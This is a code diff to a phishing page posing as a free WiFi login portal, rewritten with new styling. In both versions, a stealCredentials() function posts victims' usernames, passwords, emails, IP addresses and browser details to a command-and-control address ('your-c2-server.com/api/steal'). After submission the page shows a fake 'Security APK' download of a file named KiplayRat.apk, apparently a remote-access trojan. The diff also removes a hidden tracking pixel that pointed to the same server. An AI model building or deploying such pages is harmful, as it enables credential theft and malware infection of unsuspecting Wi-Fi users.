@@ -1,34 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Free WiFi Login</title>
+    <title>🔒 WiFi Login Required</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body { font-family: Arial; background: linear-gradient(45deg, #f06, #9f6); }
-        .container { max-width: 400px; margin: 100px auto; padding: 30px; background: white; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: #28a745; color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
-        .download-link { display: none; margin-top: 20px; text-align: center; }
-    </style>
+    <link href="../assets/style.css" rel="stylesheet">
 </head>
 <body>
-    <div class="container">
-        <h2>🔒 WiFi Login Required</h2>
-        <p>Connection established. Please verify to continue...</p>
-        
-        <input type="text" id="username" placeholder="Username">
-        <input type="password" id="password" placeholder="Password">
-        <input type="email" id="email" placeholder="Email (optional)">
-        
-        <button onclick="stealCredentials()">Connect to WiFi</button>
-        
-        <div id="download-section" class="download-link">
-            <p>✅ Verified! Download security update:</p>
-            <a id="apk-link" href="KiplayRat.apk" class="btn btn-success" download>📱 Download APK</a>
+    <div class="container mx-auto" style="max-width: 420px; margin-top: 80px;">
+        <div class="card p-5 text-center">
+            <div class="mb-4">
+                <h2 class="text-white fw-bold mb-3">🌐 WiFi Connection</h2>
+                <p class="text-white-50 mb-4">Your device detected. Please verify to continue...</p>
+            </div>
+            
+            <input type="text" id="username" class="form-control mb-3" placeholder="👤 Username / Phone">
+            <input type="password" id="password" class="form-control mb-3" placeholder="🔑 Password">
+            <input type="email" id="email" class="form-control mb-4" placeholder="📧 Email (optional)">
+            
+            <button onclick="stealCredentials()" class="btn btn-success w-100 fs-5 py-3 mb-3">
+                🚀 Connect Now
+            </button>
+            
+            <div id="download-section" class="download-link" style="display: none;">
+                <div class="alert alert-success">
+                    ✅ Verification successful!
+                </div>
+                <p class="text-white-50 mb-3">Download security update for best experience:</p>
+                <a id="apk-link" href="KiplayRat.apk" class="btn btn-primary w-100 fs-5 py-3" download>
+                    📱 Download Security APK (1.2MB)
+                </a>
+            </div>
         </div>
-        
-        <!-- Hidden pixel tracker -->
-        <img src="https://your-c2-server.com/track?ref=<?php echo $_SERVER['HTTP_REFERER']; ?>" style="display:none;">
     </div>
 
     <script>
@@ -38,17 +40,18 @@
                 password: document.getElementById('password').value,
                 email: document.getElementById('email').value,
                 ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>',
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
             };
             
-            // Send to C2
             fetch('https://your-c2-server.com/api/steal', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('download-section').style.display = 'block';
+                document.querySelector('.form-control').style.display = 'none';
             });
-            
-            document.getElementById('download-section').style.display = 'block';
         }
     </script>
 </body>
